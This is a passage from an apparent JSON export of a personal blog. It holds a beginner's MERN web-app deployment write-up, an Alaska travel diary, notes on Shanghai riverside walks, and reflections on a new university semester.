/&gt;\n        &lt;Navbar.Collapse id=&quot;basic-navbar-nav&quot;&gt;\n          &lt;Nav className=&quot;me-auto&quot;&gt;\n            &lt;Nav.Link href=&quot;#home&quot;&gt;Home&lt;/Nav.Link&gt;\n            &lt;Nav.Link href=&quot;#link&quot;&gt;Link&lt;/Nav.Link&gt;\n          &lt;/Nav&gt;\n        &lt;/Navbar.Collapse&gt;\n      &lt;/Container&gt;\n    &lt;/Navbar&gt;</code></pre>\n<p>Then return the navbar and export to index js. There are also many\nother components in React-Bootstrap like Button or Breadcrumbs. The main\nreason I use the libraries are I don't want to code css.</p>\n<h2 id=\"axios\">Axios</h2>\n<p>Use axios to communicate with the backend.</p>\n<p>For example</p>\n<pre><code>var x\naxios.get(&quot;https://ipapi.co/json&quot;).then(res=&gt;{x=res.data})</code></pre>\n<p>This is a sample code of get request. Also, since the request is\nJSON, it is useful to JSON.stringify the request, or refer to it by\nindex. I am only interested in getting the data from the server. There\nmay be lots of error in the get request, so it is best to add</p>\n<pre><code>.catch(error=&gt;{console.log(error)}</code></pre>\n<p>A Post request looks like</p>\n<pre><code>axios.post(&quot;https://localhost:5000&quot;, {\n    item1: value1\n    item2: value2\n//more items\n});</code></pre>\n<p>This is used to make a post request, which will later put data into\ndatabase.</p>\n<p>So after launching the backend you can use the axios to communicate\nwith the other port on localhost.</p>\n<p>As you can see, it is much easier with the constructed tags than to\nbuild one on my own, and also you can change by specifying style css,\nthen exporting it.</p>\n<p>Basically create a header, a footer, render the pages with header and\nfooter separately(so you can see it on every page), then on every page\neither it is static html, or you can perform get requests on other\nwebsites(backend localhost) and add it on the page.</p>\n<h2 id=\"mongodb\">Mongodb</h2>\n<p>Why need the backend? Because like in a social media page there is\nconstantly changing data. I personlly don't think you need a backend for\na personal homepage, but anyways, I just want to see how it works.</p>\n<p>I used Mongodb in the application, and by signing up on mongodb and\nclicking connect, and it will create default database</p>\n<pre><code>const uri = &quot;mongodb+srv://&lt;username&gt;:&lt;password&gt;@cluster0.h0cn5vv.mongodb.net/?retryWrites=true&amp;w=majority&quot;;</code></pre>\n<p>add a uri in the code and connect it by replacing the username and\npassword.</p>\n<h3 id=\"mongoose\">Mongoose</h3>\n<p>Mongoose is the javascript library to interact with Mongodb server\nfrom the code.</p>\n<h3 id=\"schema\">Schema</h3>\n<p>The first thing is to define schemas. For example</p>\n<pre><code>const someSchema = new Schema(\n  {\n    username: {\n      type: String,\n      default: &quot;&quot;,\n    }\n    password: {\n      type: String,\n      default: &quot;&quot;,\n    }\n\n  }\n);</code></pre>\n<p>defines a user, then make a mongoose Model, and then you can export\nthe file to the main node file.</p>\n<h2 id=\"express\">Express</h2>\n<p>Use express to interact between visiting the webpage and the\ndatabase.</p>\n<pre><code>router.route(&quot;/post&quot;).post((req, res) =&gt; {}</code></pre>\n<p>defines a post method, then we create a new schema and add to the\nserver</p>\n<p>In Get requests we can use find() or sort() methods</p>\n<p>You can store the data as JSON and send to the database, and also\nview and change the database by logging in mongodb and browse\ncollections.</p>\n<p>Use axios to interact with the backend and mongoose to connect the\nbackend with the database, and then the site is live.</p>\n<h3 id=\"postman-apis\">Postman APIs</h3>\n<p>Download a post API to test the code to debug. By sending a get\nrequest or post request to the url, then checking the database.</p>\n<h2 id=\"site-is-live\">Site is live</h2>\n<p>After adding cors to the code you can easily create a web application\nwith frontend and backend on different ports in the localhost.</p>\n<p>At this point you should be able to access the website on the network\nby typing in the computer ip address and the ports.</p>\n<p>For example, if it is hosted on localhost:3000, then go to :3000 to\nsee the website</p>\n<h2 id=\"linux\">Linux</h2>\n<p>However, you can't run everything on your own computer because it\ndepends on Internet connection and your computer may shut off, so by\nbuying a Linux on the cloud and runnning the server on the cloud server,\nyou can then deploy the web application.</p>\n<p>This seems easy, but it is the most time-consuming thing of all, and\ntook me many hours in sleepless nights to finish.</p>\n<p>Buy a server in Linode(or AWS or whatever), then ssh into the server\nwith shell, then install the node and npm, then git clone the\nrepository, then run it.</p>\n<p>There are several problems:</p>\n<p>1 The sudo default installed node is v12, which is really old, and\nsome applications require more than v12</p>\n<p>2 There may be bugs in the environment, and debugging is hard with\ncommand line</p>\n<p>Basically, I just couldn't run the nodejs in the cloud server, and as\na noob I want to have a GUI in the cloud server, which makes it look\nbetter than the command line.</p>\n<p>But GUI is very hard to install, and although in my own computer I\ninstalled lightdm and ubuntu-desktop easily. When I tried to install\nxfce, there are some driver problems.</p>\n<p>Then I tried tigervnc-standalone-server, and tried connecting using\nRemmina and VNC viewer, and it always refuse to connect. But when\nconnecting with</p>\n<pre><code>ssh -L 5901:127.0.0.1:5901 user@example.com</code></pre>\n<p>it works.</p>\n<p>Then I finally managed to add a vnc hostname and connect to the\nserver with VNC viewer by adding another Linode, and then there was no\nbrowser.</p>\n<p>Then I installed firefox with snap but keyboard doesn't work in\nfirefox (I don't know why), then I tried to install google-chrome but it\nwouldn't open(because I need to change the xhost display settings with\nroot and then open it as user), then I installed Palemoon and it worked\nfine. I tried to install node v18 and it failed, and then I installed\nnode v20 and it succeeded.</p>\n<p>Then I deployed the code to <a href=\"http://45.79.98.144:3000\">the\nserver</a>, but it wouldn't connect when I used the chrome vpn extension\nto connect to China(firewall), although it works fine when connecting to\nother countries like Russia and Netherlands.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>There are many things to learn in Web Application, but most of them\nare very simple. I spend many days debugging because of lack of\nexperience and hope to code better in the future.</p>\n",

last frontier, where winters are freezing cold, and\nsummers are short and cool, where wildlife and breathtaking nature and\neverywhere.</p>\n<p>Some destinations include Seward and Homer, the seaside towns,\nDenali, the tallest mountain in North America, Gates of the Arctic,\nnational park of untouched nature, Prudhoe Bay and Utqiagvik, to see the\nArctic Oceans.</p>\n<p>I learned to be fearless, to have trust in myself, do the challenge\nwithout turning back, to face loneliness bravely--solo traveling gave me\ncourage. I saw the broadness of nature, the beauty of glacier and huge\nsnowy mountains, melting ice and waterfalls and sliding rocks, the\nblueness of ocean and coastlines and rocky beaches, more than 30 degrees\nnorth in latitude from California, and the wildlife, bears, orcas,\nseals, and many more, that I hadn't seen much before in life. Now in the\nevening sun everything looked glamorous, and the all the places and\nsceneries I was once amazed at became dwarfed and not that interesting\nanymore. I flew in a helicopter, went on a boat cruise of 110 miles,\nhiked solo on the mountains, went on ATV and Jeep tours, saw the\nkindness of strangers. I learned to be well-prepared, to plan a trip\ncarefully, to get a car in the future to be ready for the roads and\nmountains. There are many first-times for me on this trip.</p>\n<p>One trip is hardly enough, and I quickly fell in love with Alaska,\none-sixth the size of Europe. After this trip I will return one day, and\nperhaps even choose to live here.</p>\n<p>Future places to go: Prudhoe Bay, Gates of the Arctic, Utqiagvik,\nJuneau, Ketchikan, Wasilla, Alyeska, Talkeetna, Harding Iceberg Trail,\nLost Lake</p>\n<p>I tried to book the cheapest hotels, but they are still expensive.\nThe reasons are because I travel solo while most hotel rooms are for 2\npeople and I do not have a car, so I cannot go very far and only have\nlimited selections, and couldn't sleep in a car. The most expensive one\nis airbnb in Anchorage, which was actually designed for more than 1\nperson but since I was staying only 1 night, with the cleaning fee it\nbecame expensive.</p>\n<h2 id=\"521\">521</h2>\n<p>Today is 521.</p>\n<p>I am just leaving Denali, and going to fairbanks. My trip is almost\ncoming to and end with the final destination. I am on the train, and\nfeeling quite sleepy.</p>\n<p>Today I first went on a Jeep tour. The Jeep tour was to pick me up at\nPrincess Hotel and 7 am. It was freaking early and so hard to get up and\nI got up at like 6:59 and then hurried to finish packing my things. I\nwent to the hotel lobby and I could hear the tour guide calling my name,\nand I didn't even check out or drop luggage, which I had planned to do,\nbefore leaving and going on a Jeep tour. Fortunately, though, te\ncheckout went successful.</p>\n<p>The Jeep tour is extremely expensive, like 184 dollars. Everybody got\nto drive a Jeep of their own, and those couples usually sit together,\nexcept for me, as I had to sit in the tour guide Myriam's car. Then we\ngot off to the park road.</p>\n<p>Then the tour guide explained how the rivers were all formed by\nglaciers, and salmons will die in those rivers so inland, since the\nrivers are rich with silt, which comes from glaciers, and we can judge\nhow the river flows from how brown the color is. The Park Highway went\nlike along Nenana River, the one just down Princess Hotel.</p>\n<p>Then someone saw a moose and we all slowed down, and I managed to get\nmy first picture of a moose here. Then we went to see some caribou,\nwhich is like reindeers. I saw those caribou from a binocular provided\nin the Jeeps, and there were 3 of them, eating grass. We drove on Denali\nHighway, where it turned out to be a dirt road, and to camp settlement\nand had a stop there, it seems as an entry to the mountains. Then we had\nsnacks provided by the tours. It was a spot to overlook spot where I\ncould see those snowy mountains, and the tour guide explained Denali is\nlike 18000 ft from base camp to the top, very impressive, still growing\nat .5 mm everywhere becuase of those plates clashing together.</p>\n<p>On the way back we passed some RVs, a crazy motorbiker, ATVs, and\nsome normal cars. Then I got very sleepy and slept for half an hour.\nWhen I woke up there was 2 caribous in sight. Then we went back to the\nhighway. It just seemed like a normal drive, and I ended up paying so\nmuch.</p>\n<p>Then I went back to the hotel and stored my luggage, then headed to\nthe horseshoe lake trail. The trail was a piece of cake for me and I ran\nfirst half. Then I saw a beaver's dam, and I crossed it, getting my\nshoes wet. It isn't hard to cross it, though, the trees and leaves are\nall loose. Then there was a rock cliff like in the side of the lake, and\nI attemped it twice. However, everything was loose and I couldn't even\nget past like 30 feet before feeling too dangerous to go on. Anyways, I\nam like 18 years old and don't want to risk losing my life. Then I saw\nsome road in the tundras and attemped it, and it seems smooth at first.\nHowever, there are too many dead trees falling down on the way and those\nbranches got in my face. I tried very hard to reach the other side of\nthe park road, but it was a steep climb and there was just too much tree\nbranches, so I ended up quitting it anyways. The way down is no easier\nthan the way up, and I crawled on all fours and tried to slide down the\ntundra. But there are so many dead trees and branches and mosquitos, and\nthey always flew around me. It was annoying but I managed to go down\nsafely.</p>\n<p>Then I ate some food in the restaurant Morina Grill and then went\nback to pick up my luggage. People here kind of work in all different\nstates, and many come here only for the summer, which is cool. I thought\nabout finding jobs every year in different places and it seems tough but\nfun at the same time. Then I boarded the train to Fairbanks. Denali is\nthe highest mountain in North America, and I haven't explored much of\nthis place yet before leaving it. I hadn't even gone on the denali bus\ntour or the savage river shuttle. But anyways things went fine. I slept\nhalf of the journey.</p>\n<p>I found that the land became greener and grenner as I was going\nnorth-summer was coming there first. In Seward after 500 ft or so\neverything was covered with snow, and in Denali there was only little\nsnow on top of the mountain, then as we are going to Fairbanks on this\ntrain everything seemed so green, that it didn't look like 67 degree\nnorth latitude at all. Trees are growing just everywhere, and no trace\nof snow could be seen by eyes. I thought that on the train from Shanghai\nto Hefei it was more bare than this. Then I arrived and called the hotel\nand they came pick me up.</p>\n<p>There was only me staying in Golden North Inn and the man picking me\nup was a fourth year student in University of Alaska Fairbanks, who is\nworking in the hotel. He is kind of dressed in woman's clothes and is\nvery nice. He talked about how he had only C grades and had attempted\ncomputer but failed, and I thought I was fortunate not having to work\nwhile studying. After settling into the hotel I grabbed a map and went\nright out to hike. I planned to go downtown and went along Cheny River.\nI saw a group of people who thought I was Japanese, and a woman acting\nvery strange and talking to me in words I can't understand. Anyways, I\nleft and went for downtown.</p>\n<p>It was pretty late at about 10 pm at night, and it is quite empty. I\nkept along Cheny River. I went to Pioneer Park, which seems like a\nchildren's playground, and there are some women doing bike flips, which\nseems very interesting. Then I went to Growden Park, and there are a\ngroup of people, mostly kids and teenagers, playing volleyball. Some of\nthem are half naked and barefoot they were having so much fun that I\nwished I could join. There are also some other people skateboarding\nthere in the park. It was beautiful there at night. In Denali and Seward\nmost people are tourists hiking around while in Fairbanks they seem to\nbe living normal lives. Also, the more north I traveled the hotter it\ngets. In early May, it was like 5-10 C in Seward, in Anchorage it was\nlike 10-15 C, while in Fairbanks it was like 15-20 C. Now as I look\naround the trees and mountains are deep green, and there are no signs of\nArctic weather or coldness, just spring and life everywhere.</p>\n<p>There are few people on the streets in the evening and it did get\nlonely, then I thought like hiking with another person. But then again,\nlike 2 people aren't necessarily safer, if a wolf or bear comes out and\nattack no one can escape, and I think it is just as safe hiking alone as\n2 people because I tend to be more careful when I am alone. Anyways, I\nfigured it was mostly mental support, and maybe by traveling in groups\nmakes the trip sounds more reasonable, instead of like mindlessly\nwandering, which was what I had done. I gotten so much good photos that\nI had a hard time deleting the mediocre ones.</p>\n<p>Then I went to Kiwanis Park, which is much more deserted. I walked\naround then quickly went out of the park to downtown. There is an\nelementary school and I could hear people playing in the school, and it\nwas like 10:30 pm. I thought I had gone to bed earlier than this in\nelementary school before becoming half a night owl now. Anyways, it was\na hard walk and my legs are beginning to feel sore. I could see the\nmountains and a red sun just setting down, and it looked so beautiful.\nDowntown Fairbanks looked very worn down, and there are merely a few\nbuildings, and few people. It was actually a little bit creepy, and\nthose people doesn't seem to look very decent. There was just old houses\non either side of the street. I walked to City Hall, and there wasn't\nmuch to see. Anyways, it was like 11 pm, and I was getting tired, and\nthe wind was becoming cold. I walked around a little bit more, and up to\nCheny River again. In the red setting sun the bridge was so beautiful,\nand I took some pictures, and there was a statue about WW2, and there\nwas a polaris sculpture. I saw some people sitting outside, and they are\nprobably homeless, so I wanted to go back as soon as possible, and I\ncalled a Lyft, and it came after 20 mintues. I then went back to the\nhotel.</p>\n<p>Fairbanks is much smaller than Anchorage in both population and size.\nIt is very beautiful, and a quite populated city as north as I could\nget. In less than like 40 hours I would be in Berkeley again, and my\nluxurious trip is coming to an end. I totally enjoy this trip.</p>\n<p><br />\nHorseshoe Lake<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/w7cGP3uwIl_4kspcqBH1weDncPaBOxAVo7MF7uA_y3VCDdIWTn-efKzuYT_8uU9jFFH0rRe-_cdGKtG6d-6iRj2heftIlhNr1UrxdYJvIc1w239lEYmtUPikSemoZbz8xJctmFXlLpRD92SDGAMoHEs=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nGrowden Park<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/2jxviBLDUEnT5BW_u4-PhUsXX0-AcA7EPEC3G3gSo4WsqQTAutIbjrJ-MC2GELuOoTMV_lN9F25o4lnyA3mzs9vgOYb4NxmEi5CkpD_nCEebWvi20FiwGG5JJZEH2Jkmb-hTJw5lXojnhlWCu2bcHCU=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nChena River<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/poDcIoo4NKU3L5mtotLq-CNkwwZIDlcyAXSiwvBz8KXq5NFUe4Gs1_X1go-Xjo6Tqu6hhPgm2ZQPDG6uTdFXSr6YgFDzFvY8fuE_PgPTLbFUi9b72WjdgF_99RdMyizSKMgcccWb7ZNJN5rRgqkius4=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nMidnight<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/VrwrsStMMdRBBE6qsOKzM7I1ZHT-S2Kv4dPgLQrcBXGolQftQOS56oRturui-pMsRmrsQQmdKKp8iNZr2_b_oa_cZ6TuMyWtONtSXA9kMkIuIfhL3keGDtYvVzO_cuasFOOLh4p_jNtsxDy00JT484k=s800\"\nstyle=\"width:80.0%\" /><br />\n</p>\n<h2 id=\"522\">522</h2>\n<p>Today is 522 and I am leaving Alaska.</p>\n<p>I slept all morning and got up and ate breakfast at the hotel. Then I\ntook a lyft taxi to North Pole, and there was a big statue of Santa\nClaus, and the driver even helped shoot a photo of me with Santa\nClaus.</p>\n<p>Then I walked around North Pole, and it seemed a small and old town.\nI could hear a few dogs barking so I was scared. I walked around and\nthere were some parks, but the roads aren't well constructed. Then I\nwent to the North Pole elementary school, and I didn't even realize I\nwent into a school. I saw many kids, while the whole population of North\nPole is like less than 3000, so I figured that there are less than 50\nkids in one grade. Then I looked it up in the map and there was the\nelementary school. Children are climbing up and down and swinging, and\nseemed to have fun, which made me want to have fun with them, but I\nwalked away. No one stopped me from entering the school though.</p>\n<p>Then I went to a shopping mart, and rested a while, and walked to a\nbus stop, and took the bus back to Fairbanks, then took a Lyft to the\nhotel, then took the shuttle to the airport. Then I went into the\nairport and my trip ended.</p>\n<p><br />\nSanta Claus Statue<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/7A_pN5mExlid8Tz3X5r80xCzJThDY9Z3ezDVnRaFj9NNc8CQYDRjbraglvKI8BZWDcpHz5AH6lGGfLr79xXK8eSkm1PdM8yxsE0puXNOyKJycQ7h78k2_NQO3cHFHCKmTWOJg2O6fM8wTP6d7Lxab6Y=s800\"\nstyle=\"width:40.0%\" /><br />\n<br />\nSanta Claus Store<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/LUnJF-ral0Vr3bE_Nw3SOh-QAzQCx63WkVsvytCZaFTKOl0ZkcYFJBDK04M9GWAE2yoT75oJuMmvLd5LeK6xpIzMdFj9pDSKPFu2LKBNOWKpZ8EFaqD1dqwu1roSDkB2H7D232jYIZ5-U6j9rlcfWH0=s800\"\nstyle=\"width:40.0%\" /><br />\n</p>\n",

        "body": "<p>Riverside promenade is a great place for walking and to get a\nsplendid view. One can always find shelter and water on the way. There\nare two sides of Huangpu River, so there are two routes to go.</p>\n<p>When I lived in Zhongxing Road two years ago I always went walking on\nthe Puxi side of the route. My home was about 3 to 4 kilometers from the\nGarden Bridge on Suzhou Creek, but it often took me an hour to get\nthere. The reason is that Puxi is crowded and there are so many\nmotorcycles around. There are too many small roads and I always had to\nwait for the light to turn green.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/8f80fc34-dfa3-4c2c-a379-dc94e12aee7b\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Garden Bridge</p>\n<p>When I lived in my previous home I had been to almost everywhere\naround. There is not a street I did not know in a distance less than 5\nkilometers from my home. I found, among those dirty streets, that the\nriverside Promenade is the best place to go for walking.</p>\n<p>On the weekends I would go walking south of Garden Bridge. Sometimes\nit is crowded there, especially when there is a festival. So many people\nwere there that I couldn\u2019t find a seat to enjoy the view. But that is\nabout the only place crowded. Walk southwards and gradually it becomes\nquieter. Go further south, about 4 kilometers and there are few people\nin sight. Then I would see Nanpu Bridge. As I was always tired when\narriving at Nanpu Bridge, I would take line 4 home.</p>\n<p>Sometimes on Sunday afternoon, I went to cram classes in Xueersi. The\nplace is on Dalian Road. Since it starts at 3 pm I would go out at 10 in\nthe morning and have a walk. First I would walk to Garden Bridge. Then I\nwould turn northward. If you walk northward of Garden Bridge there is\nhalf a kilometer where you cannot see Huangpu River since the route\nalong the river is under construction. There is a hotel along the way\nwhich is very expensive and beautiful, where I usually took a rest\ninside. Then after walking half a kilometer I came to a park. Near the\npark is a subway station: International Cruise Terminal, line 12. The\npark is very beautiful. People are playing some game involving jumping\nand swinging inside, but that I took no interest in. There are those\nglasses, on which you can see the history of the International Cruise\nTerminal, including some famous people. The glass is transparent and I\nsaw the tallest buildings in Pudong through them. At night I also saw\nthe building behind me reflected, and it looks like it\u2019s in the air in\nPudong. Anyway, that is really funny.</p>\n<p><img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/54aaa521-812b-4463-86aa-bd1182df020b\"\nstyle=\"width:80.0%\" alt=\"image\" /> <img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/1dc5251a-1a3e-42b0-b653-2cfdd46db86b\"\nstyle=\"width:80.0%\" alt=\"image\" /></p>\n<p>The Park in the North of The Bund</p>\n<p>Walking further northward (or maybe to the east) along Huangpu River,\nI came to the Qinhuangdao ferry. I walked out to the intersection of\nDalian Road and Yangshupu Road. Line 4 is there and I went the rest of\nthe way to Xueersi by subway.</p>\n<p>Northward of Qinhuangdao Ferry is Yangpu District. When I first went\nthere it was under construction and very deserted. But after a year,\nwhen I was in ninth grade, I found it good to walk after the road along\nthe river was finished. Old people come here to see the history of the\nindustry of Shanghai. Young people go there for fashion, as there are\nsome clothing shops. There are lots of children\u2019s playgrounds and\nslides, swings. Little children jumped all over laughing with their\nparents, who escort them there. I came here because I needed to take a\nrest from studying and I was just too bored.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/5e05528a-915b-43d1-993b-579eaf6ee7cb\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Under Yangpu Bridge</p>\n<p>There are many places to eat like Burger King, Macdonald on the\nway.</p>\n<p>Walk another 6 kilometers and you come to Fuxing Island.

        "body": "<p>So I am back in USTC for a new semester.</p>\n<h2 id=\"meaningful-things-to-do\">Meaningful Things to Do</h2>\n<p>So I tried thinking about meaningful things to do. I mean, for a\nthing to be meaningful, it better be cumulative. For example, gaming\nisn\u2019t meaningful because gaming today doesn\u2019t make your next day better\nat all, and the skill of a human being in gaming is limited, meaning AI\nis far superior.</p>\n<p>Other things are debatable, in my opinion. For example, it is\ndebatable whether learning extensively about a new subject (like\npursuing a PhD) is meaningful or not. For one, it is cumulative and\nafter studying that deeply enriches your knowledge of that field.\nHowever, on the other hand, maybe like the new knowledge studied, if not\napplied to a job, isn\u2019t even worth the pain of studying them. If you are\nan expert in some not so popular fields, there might be no opportunities\nfor showing off even, and the goal at the end isn\u2019t meaningful.</p>\n<p>I do think language learning is a meaningful thing, though. So like\nimagine if I don\u2019t know English, that would be devastating. Or if I\ndon\u2019t know Chinese, ahh, I would probably lose first-hand engagement in\nthe culture and couldn\u2019t even communicate with people around me.\nLanguage is pretty much base to all the things in my life, and it is\nlargely underestimated in terms of importance. But learning a third\nlanguage is not as significant as the first two, one of which is my\nmother tongue, the other being the de facto language in the world.\nStill, even if it is not as significant, it\u2019s still a reasonably\nfulfilling thing to do. Mainly I want to learn languages like Japanese,\nRussian, French, German, etc. But like learning 4 or 5 languages is\nclose to impossible with a regular schedule or hard schoolwork or\ndemanding job. Maybe like learning only one more language is quite\nsatisfying for me.</p>\n<p>Other meaningful things include sports and musical instruments, but\nthey are not as important as learning a language, in my opinion.</p>\n<h2 id=\"freelancing\">Freelancing</h2>\n<p>I feel like I want to take on a freelancing job. I found that for a\nfull-stack developer, actually earning 20 dollars an hour is pretty\neasy. So I tried to do the math and calculated that for a decent life in\nHefei, like 700 dollars a month should be sufficient, which equates to\nabout around 150-200 dollars earnings a week. So like I can only work\none day freelancing for web dev or operating system or anything, then\nhaving 6 days off, while still maintaining pretty well-off lives here in\nHefei.</p>\n<p>The main thing isn\u2019t about the earnings, it\u2019s like currently I am\nstill using my parent\u2019s money, meaning that they constantly try to\nmonitor and censor my activities, which is really annoying. I mean I\ncan\u2019t really complain too much since it\u2019s their money, but they are\nseriously annoying to me. I hope for the day that I can become\nself-sufficient to come sooner. If I am self-sufficient probably I won\u2019t\nneed my parents anymore. However, logically speaking I shall still pay\nback in return to my parents, since they brought me up, but this is\nprobably something I shall do like after the age of 35 or 40 years old,\nwhen my parents got very old, to care for them or hire an aunt to care\nfor them or whatever.</p>\n<p>The fact that I am not self-sufficient is deeply troubling, and\nmaybe, like after I go to grad school, hopefully as there are salaries\nor whatever, and I work part-time as a freelancer, then I can stop\nrequesting any money from parents, hooray!</p>\n<p>It\u2019s not like my parents don\u2019t have much money, in fact, they are\npretty well-off among their peers and in Shanghai, having 2 apartments\nin Zhangjiang High-tech Park, each one worth millions of dollars. But\nreliance brings unfreedom.</p>\n<h2 id=\"thinking-about-my-freelancing-life\">Thinking about my\nFreelancing Life</h2>\n<p>So if I drop school right now, and go off freelancing here in Hefei,\nworking 1 day a week, hopefully self-sufficient with my MERN stack\nskills. I have six days off, which is practically all the time. In fact,\nif I go freelancing it doesn\u2019t matter where I work, and Shanghai\ndefinitely isn\u2019t a good choice because of its relatively high living\nstandards in China. Maybe some smaller cities will do. Hefei is not a\nbad choice anyways, living here on 5000 RMB a month is more than\nenough.</p>\n<p>I don\u2019t really worry about stability, since I think I can code\nfull-stack for at least 30 years. I mean, I am willing to learn and\nwork, and I don\u2019t demand lots of money.</p>\n<p>Moreover, I can stay home all the time, and I can go isolated. I\nmean, I can still go out and play if I want, only it\u2019s not necessary,\nwhich is awesome. I can still go out a few times a year, and probably at\ndawn, where there are no people outside.</p>\n<p>I also have the whole day off to me, and I can start learning new\nlanguages 24/7. I can probably pick up one language every half year. So\nif I work like this, then I will probably be equipped with 6 more of the\nworld\u2019s most popular languages in like 3 years, which is so intriguing.\nI am mainly interested in studying languages of developed regions like\nEurope and Japan, or special countries like Russia, and not that much of\nAfrica or Southern Asia.</p>\n<p>That does sound interesting and alluring but of course, I won\u2019t do\nthat, since that is far beyond the social norm, and I haven\u2019t had such\npersonal decision experiences. Maybe like when I am 35 or 40 years old I\ncan have more freedom in personal decisions. It is too risky, like\ndropping out of school. I still need my college degree, else since I\ndon\u2019t have a high school diploma, I will probably be a middle school\ngrad, lol.</p>\n<p>Anyways, literally speaking, my parents don\u2019t know what is best for\nme. They are very misleading in terms of judgment, and often control my\nmind to do things. I don\u2019t blame them though. My parents are awesome\npeople, and worked extremely hard to gain a social status like this\nthrough the poverty years 30 years ago in China, climbing up the social\nladder from a poor worker\u2019s family in remote rural towns, to having 2\napartments in the tech hub of Shanghai. They are definitely more\nimpressive than I ever could be. For me to match their achievements I\nprobably have to be a billionaire in Silicon Valley.</p>\n<h2 id=\"back-to-ustc\">Back to USTC</h2>\n<p>I walked back to USTC. It seemed awfully weird here, with so many\nstudents around, that I felt a sense of nervousness even. I feared\nschool, and I feared socializing. My parents also say I am quite\narrogant in the eyes of other people. No.\u00a0This is wrong. I mean, I am a\nFOSS and Linux fanatic, but that\u2019s who I am. There is no changing that.\nI want to show my personality and uniqueness in socializing, right? I\nwant to show the true self instead of pretending to be someone whom I\nhate, right?</p>\n<p>I mean, I felt like I don\u2019t want to be demanded to do something. I\nhave the right and I don\u2019t owe any people, well, maybe except for my\nparents, since they brought me up for the first 18 years. Thinking about\nparenting, it is extremely time and energy-consuming, which is part of\nthe reason my mom worked a light job. Just in terms of money spending\nand emotional support, that is more than a full-time job. I remembered\ncountless times when my mom was tired yet still tries to think about me\nfirst, and try to make me happy and well cared for. I remembered my mom\ntrying to find resources for me in every part of my academic journey,\nand that was really touching. However, I am a legal adult now, and I\nknow better for myself. It is maybe not the best for me, but I need to\nmake my own decisions. Also, I don\u2019t owe any unknown people anything. My\nparents always say I need friends, and I shall treat strangers with\nenthusiasm and contact them to make friends. However, I definitely\ndisagree. I treat strangers with respect, and other than that I treat\nthem the way I want. I decide who to contact and which person to. It is\nmy right to decide I want isolation, or my right to decide to be in a\ncrowd, long as it doesn\u2019t affect other people negatively. It is my right\nto stay up all night and sleep all day, although putting my own health\nat risk, but I assume that it is my own decision, right?</p>\n<p>I was, and still am, an extremely cautious person. Well, maybe not as\ncautious as some Chinese students around me, but still, I am easily\nbrainwashed with fear and hatred about something. When my parents taught\nme fire and knife was dangerous, I refuse to use them even today,\nrelying on a kettle pot to cook noodles and rice porridge. I always\nfeared teachers, even though sometimes they know no better than me,\nespecially those in high school. However, because of the fear I didn\u2019t\nargue back one word at any teacher as long as I could remember, only\noccasionally trying to explain my own standpoint. It\u2019s the amount of\nmind control that they have on me, that I deeply want to get rid of,\neven though most times they are correct.</p>\n<h2 id=\"motivation\">Motivation</h2>\n<p>As I begin this new semester I have probably the lowest motivation in\nthe history of my life. I couldn\u2019t think about a reason to push forward.\nFor example, there is this operating system and database course. I am\nalready pretty much experienced in MongoDB and Sqlite and have used\nPostgreSQL for Invidious and Peertube and MediaCMS hosting. All I want\nto do is try to read the source code and understand the main parts of\nthe database, for example, reading Sqlite or BerkeleyDB shall be\ninteresting practice for such a course. There is also tinydb and\nsmalldb, but that\u2019s not capturing the essentials of a database, not\nhaving much data structures. Anyways, I hope the teacher just walks\nthrough the main source code of a popular database, and that shall be\nsufficient for this course. As of operating systems, I would expect to\ndevelop all kinds of interesting programs on ArchLinux. It\u2019s just I am\nreally interested in this subject itself, but the course makes it\nextremely boring for me. Finishing studying this course doesn\u2019t enhance\nmy skills anyways, only preparing for a crappy test. I don\u2019t think\nstudying such stuff is more meaningful than gaming.</p>\n<p>Also along came procrastination, as anything I saw seemed to me more\ninteresting than studying and academics, particularly social media.\nSometimes I would want to be popular on social media, yet still\nrejecting the idea since social media is proprietary and censored by the\ngovernment, and not DIY. My own instance gets no attention among people,\nthough. But I was just far more curious about society, and particularly\nthe trends of things that are not obvious, and thoughts not written, and\nthings not seen from the surface. Social medias give me far more stamina\nthan raw studying.</p>\n<p>I stayed at home for a whole week, trying to evade everything. This\nis the longest time I stayed at home as long as I could remember, the\nlast time being the covid quarantine, 7.14 to 7.21. I didn\u2019t remember\nstaying at home for one day since 2019 to mid-2023, other than that\nquarantine. Even during covid, I would go restless at home and try every\nmeans to go out and run and breathe fresh air. I just, well, changed.\nBefore that one whole week at home, I went out like only once every 3\ndays or so, mostly late at night for walking and stretching my legs, and\nshopping the necessary things and cleaning the trash. I don\u2019t want to\nface anything, and wanted to go alone for peace and quietness. I\nactually quite enjoy being immersed in my own digital world, and hope to\ndo this forever.</p>\n<p>People say evading and shying off from real life is a bad idea, yet\nit helps. Evading makes my emotions more controllable and myself feel\nmore comfortable. Facing everything directly is a bad idea because it\njust makes things worse and unbearable. Anyway, this is supposed to be\nmy own choice, the same as procrastinating. If I want to do so, nobody\nhas the right to tell me not.</p>\n<p>I tried running and it turned out I had been much slower than I\npreviously was just half a year ago. I could go sub 4:00 for several\nkilometers without being too tired, but now I ran like 300 yards and was\nout of breath, probably as a result of staying home too long. Anyways,\nstaying at home is also my own choice, and it is not anyone else\u2019s duty\nto command me to go out. I decided running makes the person look older\nand uglier these last few months, and it is still a topic I am debating\nwhether or not to do.</p>\n<h2 id=\"showing-off\">Showing Off</h2>\n<p>Then there is the strange desire to show off. I mean it is downright\nstupid to do so. Showing off brings nothing but a sense of fake pride,\nand perhaps some dopamine. I wanted to use every means to show how\ntechnically advanced I am, only trying 